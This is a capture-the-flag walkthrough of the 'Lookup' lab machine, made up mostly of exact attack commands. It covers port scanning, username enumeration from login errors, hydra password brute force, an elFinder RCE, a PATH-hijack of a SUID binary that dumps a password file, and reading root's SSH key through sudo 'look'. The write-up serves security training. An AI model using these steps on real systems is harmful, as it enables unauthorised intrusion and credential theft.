@@ -1,0 +1,123 @@
+1. Recon
+# Full TCP scan
+sudo nmap -sC -sV -p- -Pn --min-rate=10000 <TARGET_IP>
+
+
+→ Found SSH (22) and HTTP (80).
+
+2. Web Enumeration
+# Add hostname to /etc/hosts
+echo "<TARGET_IP> lookup.thm" | sudo tee -a /etc/hosts
+
+# Gobuster
+gobuster dir -u http://lookup.thm/ \
+  -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
+  -x php,html,txt -t 50
+
+
+→ Found login.php.
+
+3. Username Enumeration
+
+The login form leaks info:
+
+Wrong username → one error.
+
+Correct username, wrong password → different error.
+
+Write a Python script to test usernames, or do it manually.
+Example with requests (shortened):
+
+response = requests.post("http://lookup.thm/login.php",
+    data={"username": user, "password": "password"})
+if "Wrong password" in response.text:
+    print(f"Valid user: {user}")
+
+
+→ Found valid user: jose.
+
+4. Password Brute Force
+hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm \
+  http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong" -V
+
+
+→ Got password for jose. Logged in → redirected to files.lookup.thm.
+
+5. Exploit elFinder
+# Add new host
+echo "<TARGET_IP> files.lookup.thm" | sudo tee -a /etc/hosts
+
+
+Version identified: elFinder 2.1.47 → known RCE vuln.
+Exploit with Metasploit (or manual) → shell as www-data.
+
+6. PrivEsc — www-data → think
+
+List SUID binaries:
+
+find / -perm /4000 2>/dev/null
+
+
+Found /usr/sbin/pwm (custom).
+It runs id → parses username → reads /home/<user>/.passwords.
+
+Exploit (PATH hijack):
+
+cd /tmp
+echo 'echo "uid=1001(think) gid=1001(think) groups=1001(think)"' > id
+chmod +x id
+export PATH=/tmp:$PATH
+/usr/sbin/pwm
+
+
+→ Dumps /home/think/.passwords.
+
+Save list locally:
+
+nano think-passwords.txt
+
+
+Brute force SSH for think:
+
+hydra -l think -P think-passwords.txt ssh://lookup.thm
+
+
+→ Got creds, SSH in:
+
+ssh think@lookup.thm
+
+7. PrivEsc — think → root
+
+Check sudo rights:
+
+sudo -l
+
+
+→ think can run /usr/bin/look as root.
+
+Exploit to read root’s SSH key:
+
+sudo /usr/bin/look '' /root/.ssh/id_rsa
+
+
+Copy key to Kali:
+
+nano root_id_rsa
+chmod 600 root_id_rsa
+
+
+SSH as root:
+
+ssh -i root_id_rsa root@lookup.thm
+
+✅ Rooted 🎉
+
+User flag in /home/think/user.txt.
+
+Root flag in /root/root.txt.
+
+👉 Now you’ve got two playbooks:
+
+A general pentest checklist.
+
+A Lookup-specific walk-through with exact commands.
